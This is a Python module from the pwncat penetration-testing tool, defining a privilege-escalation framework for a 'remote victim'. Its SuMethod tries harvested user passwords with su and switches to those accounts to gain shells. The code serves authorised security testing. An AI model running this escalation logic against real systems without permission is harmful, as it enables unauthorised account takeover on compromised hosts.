#!/usr/bin/env python3
from typing import Generator, Callable, List, Any
from dataclasses import dataclass
from colorama import Fore
import threading
import socket
import os

from pwncat import util
from pwncat.file import RemoteBinaryPipe
from pwncat.gtfobins import Capability

from enum import Enum


class PrivescError(Exception):
    """ An error occurred while attempting a privesc technique """


@dataclass
class Technique:
    """
    An individual technique which was found to be possible by a privilege escalation
    method.
    
    :param user: the user this technique provides access as
    :param method: the method this technique is associated with
    :param ident: method-specific identifier
    :param capabilities: a GTFObins capability this technique provides
    """

    # The user that this technique will move to
    user: str
    """ The user this technique provides access as """
    # The method that will be used
    method: "Method"
    """ The method which this technique is associated with """
    # The unique identifier for this method (can be anything, specific to the
    # method)
    ident: Any
    """ Method specific identifier. This can be anything the method needs
    to identify this specific technique. It can also be unused. """
    # The GTFObins capabilities required for this technique to work
    capabilities: Capability
    """ The GTFOBins capabilities this technique provides. """

    def __str__(self):
        cap_names = {
            "READ": "file read",
            "WRITE": "file write",
            "SHELL": "shell",
        }
        return (
            f"{Fore.MAGENTA}{cap_names.get(self.capabilities.name, 'unknown')}{Fore.RESET} "
            f"as {Fore.GREEN}{self.user}{Fore.RESET} via {self.method.get_name(self)}"
        )


class Method:
    """
    Generic privilege escalation method. You must implement at a minimum the enumerate
    method. Also, for any capabilities which you are capable of generating techniques for,
    you must implement the corresponding methods:
    
    * ``Capability.SHELL`` - ``execute``
    * ``Capability.READ`` - ``read_file``
    * ``Capability.WRITE`` - ``write_file``
    
    Further, you can also implement the ``check`` class method to verify applicability of
    this method to the remote victim and the ``get_name`` method to generate a printable
    representation of a given technique for this method (as seen in ``privesc`` output).
    """

    # Binaries which are needed on the remote host for this privesc
    name = "unknown"
    """ Name of this method """
    BINARIES = []
    """ List of binaries to verify presence in the default ``check`` method """

    @classmethod
    def check(cls, pty: "pwncat.pty.PtyHandler") -> bool:
        """ Check if the given PTY connection can support this privesc """
        for binary in cls.BINARIES:
            if pty.which(binary) is None:
                raise PrivescError(f"required remote binary not found: {binary}")

    def __init__(self, pty: "pwncat.pty.PtyHandler"):
        self.pty = pty

    def enumerate(self, capability: int = Capability.ALL) -> List[Technique]:
        """
        Enumerate all possible techniques known and possible on the remote host for
        this method. This should only enumerate techniques with overlapping capabilities
        as specified by the ``capability`` parameter.
        
        :param capability: the requested capabilities to enumerate
        :return: A list of potentially working techniques
        """
        raise NotImplementedError("no enumerate method implemented")

    def execute(self, technique: Technique) -> bytes:
        """
        Execute the given technique to gain a shell. This is only called for techniques
        providing the Capability.SHELL capability. If there is a problem with escalation,
        the shell should be returned to normal and a ``PrivescError`` should be raised.
        
        :param technique: the technique to execute
        :return: a bytes object which will exit the new shell
        """
        raise NotImplementedError("no execute method implemented")

    def read_file(self, filename: str, technique: Technique) -> RemoteBinaryPipe:
        """
        Open the given file for reading and return a file-like object, as the user
        specified in the technique. This is only called for techniques providing the
        Capability.READ capability. If an error occurs, a ``PrivescError`` should be
        raised with a description of the problem.
        
        :param filename: path to the remote file
        :param technique: the technique to utilize
        :return: Binary file-like object representing the remote file
        """
        raise NotImplementedError("no read_file implementation")

    def write_file(self, filename: str, data: bytes, technique: Technique):
        """
        Write the data to the given filename on the remote host as the user
        specified in the technique. This is only called for techniques providing the
        Capability.WRITE capability. If an error occurs, ``PrivescError`` should
        be raised with a description of the problem.
        
        This will overwrite the remote file if it exists!
        
        :param filename: the remote file name to write
        :param data: the data to write
        :param technique: the technique to user
        """
        raise NotImplementedError("no write_file implementation")

    def get_name(self, tech: Technique) -> str:
        """
        Generate a human-readable and formatted name for this method/technique
        combination.
        
        :param tech: a technique applicable to this object
        :return: a formatted string
        """
        return str(self)

    def __str__(self):
        return f"{Fore.RED}{self.name}{Fore.RESET}"


class SuMethod(Method):

    name = "su"
    BINARIES = ["su"]

    def enumerate(self, capability=Capability.ALL) -> List[Technique]:

        result = []
        current_user = self.pty.whoami()

        for user, info in self.pty.users.items():
            if user == current_user:
                continue
            if info.password is not None or current_user == "root":
                result.append(
                    Technique(
                        user=user,
                        method=self,
                        ident=info.password,
                        capabilities=Capability.SHELL,
                    )
                )

        return result

    def execute(self, technique: Technique):

        current_user = self.pty.current_user

        password = technique.ident.encode("utf-8")

        if current_user.name != "root":
            # Send the su command, and check if it succeeds
            self.pty.run(
                f'su {technique.user} -c "echo good"', wait=False,
            )

            self.pty.recvuntil(": ")
            self.pty.client.send(password + b"\n")

            # Read the response (either "Authentication failed" or "good")
            result = self.pty.recvuntil("\n")
            # Probably, the password wasn't echoed. But check all variations.
            if password in result or result == b"\r\n" or result == b"\n":
                result = self.pty.recvuntil("\n")

            if b"failure" in result.lower() or b"good" not in result.lower():
                raise PrivescError(f"{technique.user}: invalid password")

        self.pty.process(f"su {technique.user}", delim=False)

        if current_user.name != "root":
            self.pty.recvuntil(": ")
            self.pty.client.sendall(technique.ident.encode("utf-8") + b"\n")
            self.pty.flush_output()

        return "exit"

    def get_name(self, tech: Technique):
        return f"{Fore.RED}known password{Fore.RESET}"
